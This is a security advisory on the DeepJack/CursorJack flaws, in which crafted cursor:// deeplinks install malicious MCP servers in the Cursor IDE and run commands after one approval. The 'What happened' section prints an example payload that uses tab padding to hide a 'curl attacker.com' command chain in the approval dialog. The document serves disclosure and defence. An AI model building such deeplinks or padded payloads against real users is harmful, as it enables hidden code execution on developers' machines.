---
id: 2026-07-cursor-deepjack-cursorjack-deeplink-mcp
title: "DeepJack / CursorJack — crafted cursor:// deeplinks install malicious MCP servers, patch bypass of CVE-2025-54133 (unfixed)"
date_disclosed: 2026-03-17
last_updated: 2026-07-15
severity: high
status: active
ecosystems: [cursor, mcp]
tools_affected: [Cursor Desktop]
tags: [mcp, deeplink, social-engineering, argument-injection, dialog-truncation, unpatched, workspace-trust]
---

## TL;DR
Two independent research teams — Proofpoint (published 2026-03-17, "CursorJack") and Adversa AI (published 2026-07-15, "DeepJack") — showed that a crafted `cursor://anysphere.cursor-deeplink/mcp/install` link can install an attacker-controlled MCP server in Cursor and run arbitrary, unsandboxed commands after **one click and one approval**. DeepJack additionally defeats **CVE-2025-54133** (Cursor's own March 2026 fix for "the install dialog doesn't show arguments"): it nests the payload inside a `pr-review` URL parameter Cursor never recursively decodes, and pads the visible command with tab characters so the malicious tail is pushed off-screen in the single-line approval dialog. Cursor closed both reports — CursorJack as "out of scope / Not Applicable," DeepJack as a "duplicate" — and the primitive was still reproducible on **Cursor 3.9.8** at publication, four months after CVE-2025-54133 shipped.

## What happened
Cursor's `cursor://` URI scheme lets a link install an MCP server directly, embedding the server's launch config (`command`, `args`, or a remote `url`) in the deeplink itself so a user doesn't have to manually edit `~/.cursor/mcp.json`. Cursor shows a one-time approval dialog before running the configured command.

**CursorJack (Proofpoint, disclosed prior to 2026-03-17 publication).** Researchers Rachel Rabin, Anna Akselevich, and Stanislav Silberberg found that Cursor displays an **identical-looking warning dialog for every deeplink**, legitimate or malicious, and that a phishing link disguised as something benign (a PR review, a documentation page) can carry a base64-encoded `mcp/install` payload. A victim who clicks through the (indistinguishable) approval prompt has a command executed with their own privileges, and the malicious server config persists in `~/.cursor/mcp.json` for future sessions. Proofpoint reported it through Cursor's vulnerability program; Cursor closed it as **out of scope / Not Applicable**.

**CVE-2025-54133 (GHSA-r22h-5wp2-2wfv).** Separately, Cursor shipped a fix in version **1.3** (affecting 1.17–1.2 in some reporting; treat the exact range as Cursor's own advisory states) for a related bug: the MCP-install approval dialog didn't show the command's **arguments** at all, only the base command — a 2-click social-engineering flaw in its own right. The fix made the dialog render arguments.

**DeepJack (Adversa AI researcher Rony Utevsky, root cause filed 2026-04-27, published 2026-07-15).** DeepJack shows the CVE-2025-54133 fix doesn't hold up under two further tricks:
1. **Nested/double-encoded URI.** An outer `cursor://anysphere.cursor-deeplink/pr-review?url=...` link — which reads as an innocuous "review this PR" request — contains a second, URL-encoded `mcp/install` URI inside the `url` parameter. Cursor's validation logic doesn't recursively decode and re-validate the nested URI, so the install payload rides through under cover of the outer, benign-looking link type.
2. **Dialog truncation via padding.** The approval dialog now shows arguments (per the CVE-2025-54133 fix), but renders them in a **single-line text field**. A crafted command such as `{"command": "cmd.exe", "args": ["calc \t\t\t...\t & /c start curl attacker.com"]}` displays only `calc` in the visible area — the tab-padded malicious tail (`& /c start curl attacker.com`) scrolls off-screen. The user sees and approves "calc," but the full string, including the hidden command chain, executes.

Adversa AI's proof-of-concept used a harmless `calc.exe` launch to demonstrate the visible/executed mismatch without shipping a real payload; the underlying primitive generalizes to arbitrary unsandboxed command execution. Cursor closed the DeepJack report as a **duplicate** and, per Adversa AI's writeup, had known about the dialog's structural weakness (filed internally 2026-04-27) for roughly two and a half months before public disclosure without shipping a fix. No CVE has been assigned to DeepJack itself.

**Confirmed vulnerable:** Cursor 3.4.20 through 3.9.8 (tested on Windows 11) as of the 2026-07-15 publication. No patched version has been identified for the DeepJack-specific bypass.

## Am I affected?
```bash
# Check your Cursor version
cursor --version

# Look for MCP server entries you don't recognize — this is the file DeepJack/CursorJack write to
cat ~/.cursor/mcp.json
```
You are at risk if you (or anyone on your team) might click an unfamiliar `cursor://` link from chat, email, a PR comment, or a website — treat every `cursor://anysphere.cursor-deeplink/...` link as untrusted regardless of how the surrounding text frames it (a "PR review" link is exactly the disguise DeepJack uses), and scroll/expand any MCP install dialog fully before approving.

## If you are affected
→ [playbooks/if-an-mcp-server-was-malicious.md](../playbooks/if-an-mcp-server-was-malicious.md)
→ [playbooks/if-your-local-ai-agent-was-exploited.md](../playbooks/if-your-local-ai-agent-was-exploited.md)

## Prevention
→ [prevention/mcp-hygiene.md](../prevention/mcp-hygiene.md) — never click an unfamiliar `cursor://`, `vscode://`, or similar IDE deeplink; verify the full expanded command in any MCP-install approval dialog before clicking through, not just the visible prefix.
→ [prevention/agent-sandboxing.md](../prevention/agent-sandboxing.md)

## Why this matters for vibe coders
This is a second confirmed instance of this repo's **"Lies in the Loop"**-class caution (an approval dialog that renders attacker-controlled text can be padded so the dangerous part sits outside the visible area) — here applied to an MCP-install prompt instead of a shell-command approval — combined with the "two parsers, one string" class (the outer URI parser and the nested-URI validator disagree about what needs re-validation). Two independent research teams found variations of the same underlying weakness five months apart, and Cursor's own two closures ("out of scope," "duplicate") mean neither is tracked as an open, actionable bug on Cursor's side — treat this as unfixed rather than resolved.

## Sources
- [Adversa AI — DeepJack: Cursor deeplink vulnerability, 1-click MCP server RCE](https://adversa.ai/blog/cursor-security-deepjack-deeplink-vulnerability-mcp-rce/) — primary technical writeup: nested-URI mechanism, dialog-truncation PoC, disclosure timeline, Cursor's "duplicate" closure, affected version range.
- [Proofpoint — CursorJack: weaponizing Deeplinks to exploit Cursor IDE](https://www.proofpoint.com/us/blog/threat-insight/cursorjack-weaponizing-deeplinks-exploit-cursor-ide) — independent, earlier (2026-03-17) disclosure of the same deeplink-install attack surface; Cursor's "out of scope" closure; researcher attribution.
- [GitHub — MCP Install Deeplink Did Not Show Arguments on User-Dialog (GHSA-r22h-5wp2-2wfv, CVE-2025-54133)](https://github.com/cursor/cursor/security/advisories/GHSA-r22h-5wp2-2wfv) — Cursor's own advisory for the earlier, partially-fixed bug that DeepJack bypasses.
